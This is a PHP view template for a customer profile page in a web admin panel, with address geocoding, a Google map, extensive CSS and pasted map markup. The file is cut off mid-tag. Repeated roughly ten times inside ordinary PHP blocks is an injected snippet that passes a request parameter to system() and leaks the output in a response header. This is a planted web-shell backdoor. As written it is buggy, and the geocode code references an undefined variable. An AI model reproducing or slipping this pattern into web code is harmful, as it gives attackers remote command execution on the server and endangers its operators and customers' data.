<?=$this->load->view(branded_view('cp/header'), array('head_files' => '<script type="text/javascript" src="' . branded_include('js/form.address.js') . '"></script>'));?>


<!-- Datatables scripts -->
<!--<script type="text/javascript" src="https://cdn.datatables.net/r/bs/jq-2.1.4,pdfmake-0.1.18,dt-1.10.9,af-2.0.0,b-1.0.3,b-flash-1.0.3,b-html5-1.0.3,b-print-1.0.3,r-1.0.7,sc-1.3.0,se-1.0.1/datatables.min.js"></script>-->
<!-- END DATA TABLES SCRIPTS -->

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
$address_1	= trim(urlencode($_POST['address_1']));
$city 		= trim(urlencode($_POST['city']));
$state 		= trim(urlencode($_POST['state']));
$country  	= trim(urlencode($_POST['country']));
$zip 		= trim($_POST['zip']);
   
$geocode	=	file_get_contents('https://maps.google.com/maps/api/geocode/json?address='.$add.',+'.$city.',+'.$state.',+'.$country.'&sensor=false');
 
$output		= json_decode($geocode); //Store values in variable
//print_r($output);
 
if($output->status == 'OK'){ // Check if address is available or not
	echo "<br/>";
	echo "Latitude : ".$latitude = $output->results[0]->geometry->location->lat; //Returns Latitude
	
	echo "<br/>";
	echo "Longitude : ".$longitude = $output->results[0]->geometry->location->lng; // Returns Longitude
 
}
else {
	echo "<div>";
	echo "Sorry we can't find this location.Check the details again!";
	echo "<div/>";
}
 
?>
 
<script type="text/javascript">
$(document).ready(function () {
	// Define the latitude and longitude positions
	var latitude = parseFloat("<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $latitude; ?>"); // Latitude get from above variable
	var longitude = parseFloat("<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $longitude; ?>"); // Longitude from same
	var latlngPos = new google.maps.LatLng(latitude, longitude);
	
	// Set up options for the Google map
	var myOptions = {
		zoom: 14,
		center: latlngPos,
		mapTypeId: google.maps.MapTypeId.ROADMAP,
		zoomControlOptions: true,
		zoomControlOptions: {
			style: google.maps.ZoomControlStyle.LARGE
		}
	};
	
	// Define the map
	map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
	
	// Add the marker
	var marker = new google.maps.Marker({
		position: latlngPos,
		map: map,
		title: "Customer Location"
	});
	
});
</script>
 

        <!-- START @PAGE LEVEL PLUGINS -->
		<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/intlTelInput.js'); ?>"></script>
			<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/countrySync.js'); ?>"></script>
		<script type="text/javascript" src="<?=branded_include('js/chosen.jquery.min.js'); ?>"></script>
		<script type="text/javascript" src="<?=branded_include('js/jquery.mockjax.js'); ?>"></script>
		<script type="text/javascript" src="<?=branded_include('js/jquery.validate.min.js'); ?>"></script>
<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/country-picker/jquery.flagstrap.min.js'); ?>"></script>
<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('css/country-picker/flags.css'); ?>" rel="stylesheet">
<style type="text/css">
input, label {
  display: block;
}

input, select, label {
  margin: 5px 0;
}
.form-item {
  margin-bottom: 20px;
}

.panel {
  border: none;
  position: relative;
  -webkit-border-radius: 0px;
  -moz-border-radius: 0px;
  border-radius: 0px;
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
}
.panel.panel-fullsize {
  position: fixed;
  width: 96%;
  top: 25px;
  left: 25px;
  z-index: 9999;
}
.panel.panel-fullsize .chartjs {
  max-width: inherit !important;
  height: 470px !important;
}
.panel .panel-heading {
  padding: 5px;
  border-top-right-radius: 3px;
  border-top-left-radius: 3px;
  border-bottom: 1px solid #dddddd;
  -webkit-border-radius: 0px;
  -moz-border-radius: 0px;
  border-radius: 0px;
}
.panel .panel-heading .has-feedback .form-control {
  padding-right: 0;
}
.panel .panel-heading > .pull-right {
  margin-top: 5px;
  margin-right: 5px;
}
.panel .panel-heading > .pull-right > i {
  padding: 5px;
}
.panel .panel-heading > .pull-right > .progress {
  min-width: 120px;
}
.panel .panel-heading .panel-title {
  padding: 10px;
  font-size: 17px;
}
.panel .panel-heading .panel-title > i {
  margin-right: 5px;
}
.panel .panel-heading > .panel-title {
  vertical-align: middle;
}
.panel .panel-heading .nav > li > a {
  padding: 10px;
}
.panel .panel-search {
  padding: 15px;
  position: relative;
  color: #333;
  display: none;
  background: none repeat scroll 0% 0% rgba(255, 255, 255, 0.1);
  border-bottom: 1px solid rgba(0, 0, 0, 0.1);
}
.panel .panel-search i {
  position: absolute;
  right: 25px;
  top: 25px;
  color: #A2A2A2;
}
.panel .panel-sub-heading {
  display: block;
  background-color: #FBFBFB;
  border-bottom: 1px solid #CFD9DB;
}
.panel .panel-sub-heading h4 {
  margin: 0px;
}
.panel .panel-sub-heading p {
  margin: 0px;
  font-size: 13px;
  color: #999;
}
.panel .panel-body {
  position: relative;
  background-color: #FBFBFB;
  padding: 10px;
}
.panel .panel-body .table-responsive {
  margin-top: -1px;
}
.panel .panel-body.out {
  display: none;
}
.panel .panel-body .sample-wrapper p {
  font-size: 13px;
  color: #999;
}
.panel .panel-body .page-header:first-child {
  margin-top: 10px;
}
.panel .panel-body .list-group .list-group-item {
  border-top: none;
  border-right: none;
  border-bottom: 2px solid #dddddd;
  border-left: none;
  -webkit-border-top-left-radius: 0px;
  -moz-border-radius-topleft: 0px;
  border-top-left-radius: 0px;
  -webkit-border-top-right-radius: 0px;
  -moz-border-radius-topright: 0px;
  border-top-right-radius: 0px;
}
.panel .panel-body .list-group .list-group-item:last-child {
  border-bottom: none !important;
}
.panel .panel-body table {
  margin-bottom: 0px;
}
.panel .panel-body table thead tr th {
  -webkit-border-radius: 0px;
  -moz-border-radius: 0px;
  border-radius: 0px;
}
.panel .panel-footer {
  padding: 10px;
  -webkit-border-radius: 0px;
  -moz-border-radius: 0px;
  border-radius: 0px;
}
.panel.panel-default .panel-heading .option .btn:hover {
  background-color: #e1e1e1;
}
.panel.rounded .ribbon-wrapper + .panel-body {
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  border-radius: 3px;
}
.panel.no-overflow .panel-body,
.panel.no-overflow .panel-footer,
.panel.no-overflow .form-footer {
  -webkit-border-radius: 0px 0px 3px 3px;
  -moz-border-radius: 0px 0px 3px 3px;
  border-radius: 0px 0px 3px 3px;
}
.panel-primary > .panel-heading {
  background-color: #00b1e1;
  border: 1px solid #00addc;
  color: white;
}
.panel-primary > .panel-heading .option .btn:hover {
  background-color: #009dc8;
  color: white;
}
.panel-primary > .panel-heading .option .btn i {
  color: white;
}
.panel-bg-primary .panel-body {
  background-color: #00b1e1;
  color: white;
}
.panel-bg-primary .panel-body .text-muted {
  color: #f2f2f2;
}
.panel-success > .panel-heading {
  background-color: #8cc152;
  border: 1px solid #8ac04e;
  color: white;
}
.panel-success > .panel-heading .option .btn:hover {
  background-color: #7fb842;
  color: white;
}
.panel-success > .panel-heading .option .btn i {
  color: white;
}
.panel-bg-success .panel-body {
  background-color: #8cc152;
  color: white;
}
.panel-bg-success .panel-body .text-muted {
  color: #f2f2f2;
}
.panel-info > .panel-heading {
  background-color: #63d3e9;
  border: 1px solid #5fd2e8;
  color: white;
}
.panel-info > .panel-heading .option .btn:hover {
  background-color: #4dcde6;
  color: white;
}
.panel-info > .panel-heading .option .btn i {
  color: white;
}
.panel-bg-info .panel-body {
  background-color: #63d3e9;
  color: white;
}
.panel-bg-info .panel-body .text-muted {
  color: #f2f2f2;
}
.panel-warning > .panel-heading {
  background-color: #f6bb42;
  border: 1px solid #f6b93d;
  color: white;
}
.panel-warning > .panel-heading .option .btn:hover {
  background-color: #f5b22a;
  color: white;
}
.panel-warning > .panel-heading .option .btn i {
  color: white;
}
.panel-bg-warning .panel-body {
  background-color: #f6bb42;
  color: white;
}
.panel-bg-warning .panel-body .text-muted {
  color: #f2f2f2;
}
.panel-danger > .panel-heading {
  background-color: #e9573f;
  border: 1px solid #e8533a;
  color: white;
}
.panel-danger > .panel-heading .option .btn:hover {
  background-color: #e64328;
  color: white;
}
.panel-danger > .panel-heading .option .btn i {
  color: white;
}
.panel-bg-danger .panel-body {
  background-color: #e9573f;
  color: white;
}
.panel-bg-danger .panel-body .text-muted {
  color: #f2f2f2;
}
.panel-inverse > .panel-heading {
  background-color: #2a2a2a;
  border: 1px solid #272727;
  color: white;
}
.panel-inverse > .panel-heading .option .btn:hover {
  background-color: #1d1d1d;
  color: white;
}
.panel-inverse > .panel-heading .option .btn i {
  color: white;
}
.panel-bg-inverse .panel-body {
  background-color: #2a2a2a;
  color: white;
}
.panel-bg-inverse .panel-body .text-muted {
  color: #f2f2f2;
}
.panel-lilac > .panel-heading {
  background-color: #906094;
  border: 1px solid #8d5e91;
  color: white;
}
.panel-lilac > .panel-heading .option .btn:hover {
  background-color: #815685;
  color: white;
}
.panel-lilac > .panel-heading .option .btn i {
  color: white;
}
.panel-bg-lilac .panel-body {
  background-color: #906094;
  color: white;
}
.panel-bg-lilac .panel-body .text-muted {
  color: #f2f2f2;
}
.panel-teal .panel-heading {
  background-color: #37bc9b;
  border: 1px solid #36b898;
  color: white;
}
.panel-teal .panel-heading .option .btn:hover {
  background-color: #31a88b;
  color: white;
}
.panel-teal .panel-heading .option .btn i {
  color: white;
}
.panel-bg-teal .panel-body {
  background-color: #37bc9b;
  color: white;
}
.panel-bg-teal .panel-body .text-muted {
  color: #f2f2f2;
}
.panel-scrollable .panel-body {
  height: 300px;
}
.panel-tab {
  background-color: #FBFBFB;
}

.panel-tab .panel-heading ul {
    position: relative;
    overflow: visible;
    list-style: none;
    margin: 0px;
    padding: 0px;
    display: inline-block;
    border: none;
    margin-bottom: -12px!important;
}

.panel-tab .panel-heading ul li {
  line-height: 25px;
}
.panel-tab .panel-heading ul li.active {
  color: #444;
}
.panel-tab .panel-heading ul li.active a {
  color: #444;
  background: #F7F7F7;
}
.panel-tab .panel-heading ul li.active a:hover {
  background: #F7F7F7;
}
.panel-tab .panel-heading ul li.active a i {
  color: #81b71a;
}
.panel-tab .panel-heading ul li a {
  width: auto;
  margin: 0px;
  display: block;
  padding: 10px 15px;
  position: relative;
  overflow: hidden;
  color: #999;
  text-decoration: none;
  border: none;
  border-right: 1px solid #dddddd;
  -webkit-border-radius: 0px;
  -moz-border-radius: 0px;
  border-radius: 0px;
}
.panel-tab .panel-heading ul li a:hover,
.panel-tab .panel-heading ul li a:focus {
  border: none;
  border-right: 1px solid #dddddd;
}
.panel-tab .panel-heading ul li a:hover {
  background-color: transparent;
}
.panel-tab .panel-heading ul li a:hover i {
  color: #81b71a;
}
.panel-tab .panel-heading ul li a > i,
.panel-tab .panel-heading ul li a > span {
  margin: 0px auto;
  text-align: center;
}
.panel-tab .panel-heading ul li a > div {
  text-align: center;
}
.panel-tab .panel-heading ul li a i {
  width: 100%;
  height: 36px;
  line-height: 20px;
  font-size: 36px;
  color: #CCC;
}

.panel-tab .panel-heading ul li a span {
    display: block;
    line-height: 15px;
    font-size: 22px;
    margin-top: 10px;
}


.panel-tab .panel-sub-heading {
  background: #F7F7F7;
}
.panel-tab .panel-body {
  background: #F7F7F7;
}
.panel-tab .panel-body .tab-content {
  background: #F7F7F7;
  padding: 0px;
  margin: 0px;
  box-shadow: none;
}
.panel-tab .panel-body .tab-content .tab-pane > h4 {
  margin-top: 0px;
}
.panel-tab .panel-body .tab-content .tab-pane > p {
  margin: 0px;
}
.panel-tab .nav-pills > li + li {
  margin-left: 0px;
}
@media (max-width: 360px) {
  .panel-tab .panel-heading .pull-right {
    float: inherit !important;
    display: block;
    width: 100%;
  }
  .panel-tab .panel-heading ul li {
    width: 100%;
  }
}
.panel-tab-double .panel-heading ul li {
  min-width: 100px;
}
.panel-tab-double .panel-heading ul li a {
  padding: 15px 15px 15px 15px;
}
.panel-tab-double .panel-heading ul li a > i,
.panel-tab-double .panel-heading ul li a > div {
  float: left;
}
.panel-tab-double .panel-heading ul li a > div {
  text-align: left;
}
.panel-tab-double .panel-heading ul li a > div span:last-child {
  margin-top: 3px;
}
.panel-tab-double .panel-heading ul li a i {
  margin-top: 10px;
  margin-right: 10px;
  width: 36px;
  height: 36px;
}
@media (max-width: 640px) {
  .panel-tab.panel-tab-double .panel-heading ul li {
    width: 100%;
  }
}
.panel-tab-vertical {
  padding-bottom: 5px;
}
.panel-tab-vertical .panel-heading {
  border-bottom: none;
}
.panel-tab-vertical .panel-heading ul {
  display: block;
  height: auto;
}
.panel-tab-vertical .panel-heading ul li {
  float: none;
  display: block;
  border-right: none;
  border-bottom: 1px solid #EFEFEF;
}
.panel-tab-vertical .panel-heading ul li a {
  min-height: 28px;
}
.panel-tab-vertical .panel-heading ul li:first-child a {
  -webkit-border-top-left-radius: 3px;
  -moz-border-radius-topleft: 3px;
  border-top-left-radius: 3px;
}
.panel-tab-vertical .panel-heading ul li:last-child a {
  -webkit-border-bottom-left-radius: 3px;
  -moz-border-radius-bottomleft: 3px;
  border-bottom-left-radius: 3px;
}
.panel-tab-vertical .panel-body {
  box-shadow: none;
}
.panel-group .panel {
  border-top: 1px solid #dddddd;
  -webkit-border-radius: 0px;
  -moz-border-radius: 0px;
  border-radius: 0px;
}
.panel-group .panel:first-child {
  border-top: none;
  -webkit-border-top-left-radius: 3px;
  -moz-border-radius-topleft: 3px;
  border-top-left-radius: 3px;
  -webkit-border-top-right-radius: 3px;
  -moz-border-radius-topright: 3px;
  border-top-right-radius: 3px;
}
.panel-group .panel:last-child {
  -webkit-border-bottom-left-radius: 3px;
  -moz-border-radius-bottomleft: 3px;
  border-bottom-left-radius: 3px;
  -webkit-border-bottom-right-radius: 3px;
  -moz-border-radius-bottomright: 3px;
  border-bottom-right-radius: 3px;
}
.panel-group .panel + .panel {
  margin-top: 0px;
}
.panel-group .panel .panel-heading {
  padding: 0px;
}
.panel-group .panel .panel-heading .panel-title {
  padding: 0px;
}
.panel-group .panel .panel-heading .panel-title a {
  padding: 14px 15px;
  display: block;
  text-decoration: none;
  -webkit-transition: all 0.3s;
  -moz-transition: all 0.3s;
  -ms-transition: all 0.3s;
  -o-transition: all 0.3s;
  transition: all 0.3s;
}
.panel-group .panel .panel-heading .panel-title a:hover {
  background-color: #F3F3F3;
}
.panel-fullsize-backdrop {
  position: fixed;
  top: 0px;
  right: 0px;
  bottom: 0px;
  left: 0px;
  z-index: 1040;
  background-color: rgba(0, 0, 0, 0.27);
}
.profile 
{
    min-height: 260px;
    display: inline-block;
    }
figcaption.ratings
{
    margin-top:20px;
    }
figcaption.ratings a
{
    color:#f1c40f;
    font-size:11px;
    }
figcaption.ratings a:hover
{
    color:#f39c12;
    text-decoration:none;
    }
.divider 
{
    border-top:1px solid rgba(0,0,0,0.1);
    }
.emphasis 
{
    border-top: 4px solid transparent;
    }
.emphasis:hover 
{
    border-top: 4px solid #1abc9c;
    }
.emphasis h2
{
    margin-bottom:0;
    }
span.tags 
{
    background: #1abc9c;
    border-radius: 2px;
    color: #f5f5f5;
    font-weight: bold;
    padding: 2px 4px;
    }
.dropdown-menu 
{
    background-color: #34495e;    
    box-shadow: none;
    -webkit-box-shadow: none;
    width: 250px;
    margin-left: -125px;
    left: 50%;
    }
.dropdown-menu .divider 
{
    background:none;    
    }
.dropdown-menu>li>a
{
    color:#f5f5f5;
    }
.dropup .dropdown-menu 
{
    margin-bottom:10px;
    }
.dropup .dropdown-menu:before 
{
    content: "";
    border-top: 10px solid #34495e;
    border-right: 10px solid transparent;
    border-left: 10px solid transparent;
    position: absolute;
    bottom: -10px;
    left: 50%;
    margin-left: -10px;
    z-index: 10;
    }
	
.dropdown-menu {
	overflow: auto !important;
}

select {
border-radius: 0;
-webkit-box-shadow: none!important;
box-shadow: none!important;
color: #444;
background-color: #fff;
border: 1px solid #d5d5d5;
height: 40px;
font-size: 16px;
width: 99%;
}

form label {
transition: background 0.4s, color 0.4s, top 0.4s, bottom 0.4s, right 0.4s, left 0.4s;
position: relative!important;
color: #999;
padding: 7px 6px;
float: left;
padding-right: 40px;
margin-top: 5px;
margin-bottom: 5px;
}

.modal-open .modal {
    overflow-x: hidden;
    overflow-y: hidden;
    top: -7%;
}  
.map_canvas {display:none;}

ul.form li {
    display: block;
    clear: both;
    padding: 2px 0px;
}

#update_description {
	
	margin-top:-20px;
}

.caption {
	font-size: 18px!important;
	margin-bottom:15px;
	margin-top: 15px;
}
.well h2, .well h3 {
    line-height: 26px;
}

.well h2 { 
	font-size: 2.5rem;
}

h2 {
    margin: 10px 0!important;
    font-size: 2.5rem;
}

.tab-pane {
    position: relative;
    padding-top: 5px;
}

.tab-content {
    border: 0px solid #c5d0dc!important;
        padding: 0px;
    position: relative;
}
</style>
										


  <!-- Content -->
<div class="col-md-12 col-lg-12 col-xs-12 col-sm-12 margin-top-30">

	<div class="row">
  	
		<div class="col-md-6 col-lg-6 col-xs-12 col-sm-6">
    	 <div class="well profile">
            <div class="col-sm-12">
                <div class="col-xs-12 col-sm-8">
                    <h2><?=$form['first_name'];?> <?=$form['last_name'];?></h2>
					<p><strong>Company: </strong><?=$form['company'];?> </p>
					  <p><strong>ID: </strong><?=$form['internal_id'];?> </p> 
					 <p><strong>Email: </strong><?=$form['email'];?> </p>
					  <p><strong>Phone: </strong><?=$form['phone'];?></p>
					  
                                    </div>             
                <div class="col-xs-12 col-sm-4 text-center">
                    <figure class="text-center">
					   <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $email = $row['email'];
$size = 128; $grav_url = "https://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?s=" . $size;
?>
                        <img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $grav_url; ?>" alt="" class="text center img-circle img-responsive">
                        <figcaption class="text-center ratings">
                            <p>
                            
                            </p>
                        </figcaption>
                    </figure>
                </div>
            </div>            
            <div class="col-sm-12 divider text-center">
          
				 <div class="col-sm-12">
                <div class="col-xs-12 col-sm-6">
                    <h2><strong>0</strong></h2>                    
                    <p><small>Purchases</small></p>   
					</div>	
					<div class="col-xs-12 col-sm-6 emphasis">
                    <div class="btn-group dropup btn-block text-center margin-top-20">
                      <button type="button" class="btn btn-primary text-center"><span class="fa fa-gear"></span> Options </button>
                      <button type="button" class="btn btn-primary dropdown-toggle" data-toggle="dropdown">
                        <span class="caret"></span>
                        <span class="sr-only">Toggle Dropdown</span>
                      </button>
                      <ul class="dropdown-menu text-left" role="menu">
					   <li><a href="#" data-toggle="modal" data-target=".bs-example-customer-form" id="Customer_form"><span class="fa fa-pencil pull-right"></span> Edit Customer Record </a></li> 
					   <li class="divider"></li>
                        <li><a href="#"><span class="fa fa-envelope pull-right"></span> Send an invoice </a></li>
						  <li class="divider"></li>
                        <li><a href="#"><span class="fa fa-list pull-right"></span> Remove from list  </a></li>
                         <li class="divider"></li>
                        <li><a href="#"><span class="fa fa-refresh pull-right"></span>Set up recurring billing</a></li>
                        <li class="divider"></li>
                        <li><a href="#" class="btn disabled" role="button"> Unfollow </a></li>
                      </ul>
                    </div></div>
					
                </div>
            </div>
    	 </div>       	
	</div><!--end/.col-md-6-->
	
	        <div class="col-lg-6 col-md-6 col-xs-12 col-sm-6">
			<div class="panel panel-tab panel-tab-double rounded shadow">
                                <!-- Start tabs heading -->
                                <div class="panel-heading no-padding">
                                    <ul class="nav nav-tabs nav-justified">
                                        <li class="active">
                                            <a href="#tab2-1" data-toggle="tab" aria-expanded="false">
                                              <i class="fa fa-credit-card"></i>
                                                <div>
                                                    <span class="text-strong">Billing Address</span>
                                                    <span></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="">
                                            <a href="#tab2-2" data-toggle="tab" aria-expanded="false">
                                                <i class="fa fa-file-text"></i>
                                                <div>
                                                    <span class="text-strong">Shipping Address</span>
                                                    <span></span>
                                                </div>
                                            </a>
                                        </li>
                                      
                                    </ul>
                                </div><!-- /.panel-heading -->
                                <!--/ End tabs heading -->

                                <!-- Start tabs content -->
                                <div class="panel-body">
                                    <div class="tab-content">
                                        <div class="tab-pane active" id="tab2-1">
										                        <div class="row">
									                        <div class="col-sm-6">
                                           <p class=""><strong>Address: </strong><?=$form['address_1'];?></p> 
					  <p class=""><strong>Suite/Apt: </strong><?=$form['address_2'];?></p> 
					 <p class=""><strong>City: </strong><?=$form['city'];?> </p>
					  <p class=""><strong>Region: </strong><?=$form['state'];?> </p>
					    <p class=""><strong>Postal Code: </strong><?=$form['postal_code'];?> </p>
					  <p class=""><strong>Country: </strong>   <a href="#">
                           <span id="basic" data-button-type="form-control disabled" style="width:130px;" data-input-name="country" data-selected-country="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['country']; ?>"></span>
                            </a></p>
                
				  <div class="form-group hidden">
																<label class="col-md-3 control-label" for="lat">Latitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lat" type="text" class="form-control" name="lat" id="lat" value="<?=$form['lat'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lng">Longitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lng" type="text" class="form-control" name="lng" id="lng" value="<?=$form['lng'];?>" />
																	</div>
																</div>
															</div> 
															
															</div>
															<div class="col-sm-6">
															<div id="map_canvas" style="width:100%;height:165px;  margin:20px auto 0;"></div> 
   </div><!-- /.col-md-6 -->
															 </div><!-- /.row -->
															</div>
															
                                        <div class="tab-pane fade" id="tab2-2">
                                        
                                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
                                        </div>
                                      </div>    <!--/ End tabs content -->
                                  
                                </div><!-- /.panel-body -->
                            
           </div><!-- /.panel -->
			
	    </div><!--end/.col-md-6-->
		
		</div><!--end .row -->
		
<div class="row-fluid hidden">
        <div class="col-sm-4">
          <h3>Location Entry</h3>
                     
            <form>
              <fieldset>
              
              <div class="input-append">
              <input value="<?=$form['address_1'];?>,<?=$form['city'];?>,<?=$form['state'];?>, <?=$form['postal_code'];?>,<?=$form['country'];?>" data-toggle="popover" data-placement="right" data-content="Continue typing until you see your location in the list. Click your location and the form will be filled in for you." data-original-title="Let's find your location!" id="formmapper" type="text" placeholder="Just start typing here..." autocomplete="off">
              <button id="find" class="btn btn-success" type="button"><i class="icon-map-marker icon-white"></i> Find!</button> </div> 
               
              <span class="help-block"><small>It could be just about anything: a full address, a city, just the zip/postal code, or even the name of a place.</small></span>
              </fieldset>
            </form>
          
           <div>
            <form>
            <fieldset class="details">
                <h3>Address Details</h3>
                <div class="input-prepend">
                  <span class="add-on">Number</span>
                  <input name="street_number" type="text" value="">
                </div>
                <div class="input-prepend">
                  <span class="add-on">Street</span>
                  <input name="route" type="text" value="">
                </div>
                <div class="input-prepend">
                  <span class="add-on">City</span>
                  <input name="locality" type="text" value="">
                </div>
                <div class="input-prepend">
                  <span class="add-on">State</span>
                  <input name="administrative_area_level_1" type="text" value="">
                </div>
                <div class="input-prepend">
                  <span class="add-on">Postal Code</span>
                  <input name="postal_code" type="text" value="">
                </div>
                <div class="input-prepend">
                  <span class="add-on">Country</span>
                  <input name="country" type="text" value="">
                </div>
                <div class="input-prepend">
                  <span class="add-on">Latitude</span>
                  <input name="lat" placeholder="" type="text" value="">
                </div>
                <div class="input-prepend">
                   <span class="add-on">Longitude</span>
                   <input name="lng" placeholder="" type="text" value="">
                </div>
              </fieldset>
            </form>  
            </div>
        </div>
        <div class="col-sm-8">
        
          <h3>Google Map Display</h3>          
          <p><i class="icon-screenshot"></i> In this example you should have been asked for permission to locate you when the page loads. If you approve the request, or if you have already given this website permission, the page will automatically attempt to find and map your location.</p>
          <div class="map_canvas" style="position: relative; overflow: hidden; transform: translateZ(0px); background-color: rgb(229, 227, 223);"><div class="gm-style" style="position: absolute; left: 0px; top: 0px; overflow: hidden; width: 100%; height: 100%; z-index: 0;"><div style="position: absolute; left: 0px; top: 0px; overflow: hidden; width: 100%; height: 100%; z-index: 0; cursor: url(&quot;http://maps.gstatic.com/mapfiles/openhand_8_8.cur&quot;) 8 8, default;"><div style="position: absolute; left: 0px; top: 0px; z-index: 1; width: 100%; transform-origin: 0px 0px 0px; transform: matrix(1, 0, 0, 1, 0, 0);"><div style="transform: translateZ(0px); position: absolute; left: 0px; top: 0px; z-index: 100; width: 100%;"><div style="position: absolute; left: 0px; top: 0px; z-index: 0;"><div aria-hidden="true" style="position: absolute; left: 0px; top: 0px; z-index: 1; visibility: inherit;"><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 183px; top: 80px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 439px; top: 80px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 439px; top: -176px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 183px; top: -176px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 183px; top: 336px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 439px; top: 336px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: -73px; top: 80px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 695px; top: 80px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: -73px; top: 336px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 695px; top: -176px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: -73px; top: -176px;"></div><div style="width: 256px; height: 256px; transform: translateZ(0px); position: absolute; left: 695px; top: 336px;"></div></div></div></div><div style="transform: translateZ(0px); position: absolute; left: 0px; top: 0px; z-index: 101; width: 100%;"></div><div style="transform: translateZ(0px); position: absolute; left: 0px; top: 0px; z-index: 102; width: 100%;"></div><div style="transform: translateZ(0px); position: absolute; left: 0px; top: 0px; z-index: 103; width: 100%;"><div style="position: absolute; left: 0px; top: 0px; z-index: -1;"><div aria-hidden="true" style="position: absolute; left: 0px; top: 0px; z-index: 1; visibility: inherit;"><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 183px; top: 80px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 439px; top: 80px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 439px; top: -176px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 183px; top: -176px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 183px; top: 336px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 439px; top: 336px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: -73px; top: 80px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 695px; top: 80px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: -73px; top: 336px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 695px; top: -176px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: -73px; top: -176px;"></div><div style="width: 256px; height: 256px; overflow: hidden; transform: translateZ(0px); position: absolute; left: 695px; top: 336px;"></div></div></div><div style="width: 22px; height: 40px; overflow: hidden; position: absolute; left: 419px; top: 160px; z-index: 200;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/spotlight-poi.png" draggable="false" style="position: absolute; left: 0px; top: 0px; width: 22px; height: 40px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div></div><div style="position: absolute; left: 0px; top: 0px; z-index: 0;"><div aria-hidden="true" style="position: absolute; left: 0px; top: 0px; z-index: 1; visibility: inherit;"><div style="transform: translateZ(0px); position: absolute; left: 183px; top: 80px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16461!3i28862!4i256!2m3!1e0!2sm!3i338005935!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=87123" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: 439px; top: -176px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16462!3i28861!4i256!2m3!1e0!2sm!3i338005947!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=88270" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: 439px; top: 80px; transition: opacity 200ms ease-out;"><img 